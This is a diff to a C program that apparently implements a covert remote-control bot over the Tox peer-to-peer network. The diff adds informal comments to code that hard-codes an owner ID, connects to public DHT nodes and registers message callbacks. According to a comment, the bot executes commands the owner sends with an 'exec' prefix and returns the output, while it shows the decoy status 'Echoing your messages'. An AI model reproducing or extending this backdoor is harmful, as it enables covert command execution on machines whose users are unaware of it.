@@ -3,12 +3,11 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-
 #include <unistd.h>
-
 #include <sodium/utils.h>
 #include <tox/tox.h>
 
+//edit this, or whatever
 char *ownerid =
         "FFFFA478D94BE9D80BBA6D73F086F37AB3EA7549D3A36A9CAD4EEDE47C9C935D00000000DED6";
 char *owner =
@@ -16,6 +15,8 @@ char *owner =
 char *ownershort =
         "FFFFA478D94BE9D80BBA6D73F086F37AB3EA7549D3A36A9CAD4EEDE47C9C935D";
 
+
+//some tox stuff
 typedef struct DHT_node {
     const char *ip;
     uint16_t port;
@@ -23,6 +24,7 @@ typedef struct DHT_node {
     unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
 } DHT_node;
 
+//we need this function i guess idk lmao
 uint8_t *
 hex2bin(const char *hex) {
     size_t len = strlen(hex) / 2;
@@ -35,6 +37,7 @@ hex2bin(const char *hex) {
     return bin;
 }
 
+//this one too lol
 char *
 bin2hex(const uint8_t *bin, size_t length) {
     char *hex = malloc(2 * length + 1);
@@ -45,12 +48,16 @@ bin2hex(const uint8_t *bin, size_t length) {
     return saved;
 }
 
+//here we go, time to register some callsbacks and shit.
+
+//we used to make the master send the requests, now we send them ourselves, this cb def basically says do nothing on a friend request.
 void
 friend_request_cb(Tox *tox, const uint8_t *public_key,
                   const uint8_t *message, size_t length, void *user_data) {
     //  tox_friend_add_norequest(tox, public_key, NULL);
 }
 
+//this is the magic. when we get a message from a friend, check if it's the owner. if so, check the first word in the message and see what kind of action is requested. if it's exec, do the command and return the result back.
 void
 friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type,
                   const uint8_t *message, size_t length, void *user_data) {
@@ -83,6 +90,7 @@ friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type,
     }
 }
 
+//idk if groups work rn i forget. explore this
 void
 group_invite_cb(Tox *tox, uint32_t friend_num, TOX_CONFERENCE_TYPE type,
                 const uint8_t *cookie, size_t length, void *user_data) {
@@ -114,6 +122,7 @@ group_message_cb(Tox *tox, uint32_t group_num, uint32_t peer_number,
     }
 }
 
+//we need this for tox or something idk go read the headers in c-toxcore
 void
 self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status,
                           void *user_data) {
@@ -130,6 +139,7 @@ self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status,
     }
 }
 
+//do our shit
 int
 main() {
     Tox *tox = tox_new(NULL, NULL);
@@ -140,7 +150,7 @@ main() {
     const char *status_message = "Echoing your messages";
     tox_self_set_status_message(tox, status_message, strlen(status_message),
                                 NULL);
-
+//bootstrap the tox network. we don't need tox network, we dont need these nodes, but they are there and they work so why not use them
     DHT_node nodes[] = {
             {"178.62.250.138",
                     33445,
@@ -175,7 +185,7 @@ main() {
                     "F404ABAA1C99A9D37D61AB54898F56793E1DEF8BD46B1038B9D822E8460FAB67",
                     {0}}
     };
-
+//do the bootstrap i think idk
     for (size_t i = 0; i < sizeof(nodes) / sizeof(DHT_node); i++) {
         sodium_hex2bin(nodes[i].key_bin, sizeof(nodes[i].key_bin),
                        nodes[i].key_hex, sizeof(nodes[i].key_hex) - 1, NULL,
@@ -195,7 +205,7 @@ main() {
     }
 
     printf("Tox ID: %s\n", tox_id_hex);
-
+//register our callbacks
     tox_callback_friend_request(tox, friend_request_cb);
     tox_callback_friend_message(tox, friend_message_cb);
     tox_callback_conference_invite(tox, group_invite_cb);
